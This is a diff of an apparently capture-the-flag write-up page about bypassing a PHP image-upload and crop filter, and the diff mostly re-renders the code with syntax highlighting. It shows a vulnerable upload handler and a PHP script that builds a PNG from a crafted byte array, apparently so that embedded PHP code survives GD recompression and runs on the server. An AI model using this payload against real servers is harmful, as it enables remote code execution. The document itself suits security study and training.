+</span><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="nv">$size_check</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">40</span> <span class="o">||</span> <span class="nv">$size_check</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">40</span><span class="p">)</span> <span class="p">{</span> 
+                <span class="k">echo</span> <span class="s2">&#34;Ảnh của bạn hơi nhỏ. Chúng tôi cần ảnh lớn hơn 40x40 pixels</span><span class="se">\n</span><span class="s2">&lt;br&gt;&#34;</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="k">if</span><span class="p">(</span><span class="nv">$file_ext</span> <span class="o">===</span> <span class="s1">&#39;jpg&#39;</span><span class="p">){</span>
+                    <span class="nx">imagejpeg</span><span class="p">(</span><span class="nv">$cropped_image</span><span class="p">,</span> <span class="nv">$upload_dir</span> <span class="o">.</span> <span class="nv">$new_file_name</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$cropped_image</span><span class="p">,</span> <span class="nv">$upload_dir</span> <span class="o">.</span> <span class="nv">$new_file_name</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">echo</span> <span class="s2">&#34;ảnh đã được lưu tại đây</span><span class="se">\n</span><span class="s2">&lt;br&gt;&#34;</span><span class="p">;</span>
+                <span class="k">echo</span> <span class="nv">$upload_dir</span><span class="p">;</span>
+                <span class="k">echo</span> <span class="nv">$new_file_name</span><span class="p">;</span>  
 
-                imagedestroy($image);
-                imagedestroy($cropped_image);
-            }
-        } else {
-            imagepng($cropped_image, $upload_dir . $new_file_name);
-            echo &quot;ảnh đã được lưu tại đây\n&lt;br&gt;&quot;;
-            echo $upload_dir;
-            echo $new_file_name;  
+                <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$image</span><span class="p">);</span>
+                <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$cropped_image</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$cropped_image</span><span class="p">,</span> <span class="nv">$upload_dir</span> <span class="o">.</span> <span class="nv">$new_file_name</span><span class="p">);</span>
+            <span class="k">echo</span> <span class="s2">&#34;ảnh đã được lưu tại đây</span><span class="se">\n</span><span class="s2">&lt;br&gt;&#34;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="nv">$upload_dir</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="nv">$new_file_name</span><span class="p">;</span>  
 
-            imagedestroy($image);
-            imagedestroy($cropped_image);
-        }
-    } else {        
-        echo &quot;Chỉ cho phép tải lên tệp JPG hoặc PNG và pHp ;D ? ? ?&quot;;
-    }
-}
-?&gt;
-&lt;!-- HTML Form để tải lên tệp --&gt;
-&lt;h3&gt;upload file ảnh miễn phí nhưng tôi sẽ nén chất lượng của bạn xuống 40px&lt;/h3&gt;
-&lt;form action=&quot;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
-    &lt;input type=&quot;file&quot; name=&quot;image&quot;&gt;
-    &lt;input type=&quot;submit&quot; value=&quot;Tải Lên&quot;&gt;
-&lt;/form&gt;
-</code></pre><ul>
+            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$image</span><span class="p">);</span>
+            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$cropped_image</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>        
+        <span class="k">echo</span> <span class="s2">&#34;Chỉ cho phép tải lên tệp JPG hoặc PNG và pHp ;D ? ? ?&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">&lt;!-- HTML Form để tải lên tệp --&gt;
+</span><span class="err">&lt;h3&gt;upload file ảnh miễn phí nhưng tôi sẽ nén chất lượng của bạn xuống 40px&lt;/h3&gt;
+</span><span class="err">&lt;form action=&#34;&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;
+</span><span class="err">    &lt;input type=&#34;file&#34; name=&#34;image&#34;&gt;
+</span><span class="err">    &lt;input type=&#34;submit&#34; value=&#34;Tải Lên&#34;&gt;
+</span><span class="err">&lt;/form&gt;
+</span></code></pre></div><ul>
 <li>
 <p>Alow upload php extendtion, jpg and png we chose php :&lt;</p>
 </li>
@@ -447,30 +661,29 @@ if(isset($_FILES['image'])){
 <p>You have 2 or more ways to solve this problem</p>
 </li>
 </ul>
-<p>Tool : <a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">IDAT</a> or</p>
-<pre><code>&lt;?php
+<p>Tool: <a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">IDAT</a> or</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
  
-header('Content-Type: image/png');
+<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: image/png&#39;</span><span class="p">);</span>
  
-$p = array(0xA3, 0x9F, 0x67, 0xF7, 0x0E, 0x93, 0x1B, 0x23, 0xBE, 0x2C, 0x8A, 0xD0, 0x80, 0xF9, 0xE1, 0xAE, 0x22, 0xF6, 0xD9, 0x43, 0x5D, 0xFB, 0xAE, 0xCC, 0x5A, 0x01, 0xDC, 0xAA, 0x52, 0xD0, 0xB6, 0xEE, 0xBB, 0x3A, 0xCF, 0x93, 0xCE, 0xD2, 0x88, 0xFC, 0x69, 0xD0, 0x2B, 0xB9, 0xB0, 0xFB, 0xBB, 0x79, 0xFC, 0xED, 0x22, 0x38, 0x49, 0xD3, 0x51, 0xB7, 0x3F, 0x02, 0xC2, 0x20, 0xD8, 0xD9, 0x3C, 0x67, 0xF4, 0x50, 0x67, 0xF4, 0x50, 0xA3, 0x9F, 0x67, 0xA5, 0xBE, 0x5F, 0x76, 0x74, 0x5A, 0x4C, 0xA1, 0x3F, 0x7A, 0xBF, 0x30, 0x6B, 0x88, 0x2D, 0x60, 0x65, 0x7D, 0x52, 0x9D, 0xAD, 0x88, 0xA1, 0x66, 0x94, 0xA1, 0x27, 0x56, 0xEC, 0xFE, 0xAF, 0x57, 0x57, 0xEB, 0x2E, 0x20, 0xA3, 0xAE, 0x58, 0x80, 0xA7, 0x0C, 0x10, 0x55, 0xCF, 0x09, 0x5C, 0x10, 0x40, 0x8A, 0xB9, 0x39, 0xB3, 0xC8, 0xCD, 0x64, 0x45, 0x3C, 0x49, 0x3E, 0xAD, 0x3F, 0x33, 0x56, 0x1F, 0x19 );
+<span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x19</span> <span class="p">);</span>
  
-$img = imagecreatetruecolor(110, 110);
+<span class="nv">$img</span> <span class="o">=</span> <span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">110</span><span class="p">,</span> <span class="mi">110</span><span class="p">);</span>
  
-for ($y = 0; $y &lt; sizeof($p); $y += 3) {
-$r = $p[$y];
-$g = $p[$y+1];
-$b = $p[$y+2];
-$color = imagecolorallocate($img, $r, $g, $b);
-imagesetpixel($img, round($y / 3)*2, 0, $color);
-imagesetpixel($img, round($y / 3)*2+1, 0, $color);
-imagesetpixel($img, round($y / 3)*2, 1, $color);
-imagesetpixel($img, round($y / 3)*2+1, 1, $color);
-}
+<span class="k">for</span> <span class="p">(</span><span class="nv">$y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$y</span> <span class="o">&lt;</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span> <span class="nv">$y</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+<span class="nv">$r</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="p">];</span>
+<span class="nv">$g</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+<span class="nv">$b</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
+<span class="nv">$color</span> <span class="o">=</span> <span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nv">$r</span><span class="p">,</span> <span class="nv">$g</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>
+<span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
+<span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
+<span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
+<span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
+<span class="p">}</span>
  
-imagepng($img);
-?&gt;
-
-</code></pre><p><img src="https://hackmd.io/_uploads/rk-ki1OsT.png" alt="image"></p>
+<span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p><img src="https://hackmd.io/_uploads/rk-ki1OsT.png" alt="image"></p>
 <p><img src="https://hackmd.io/_uploads/SyDlj1usT.png" alt="image"></p>
 
 
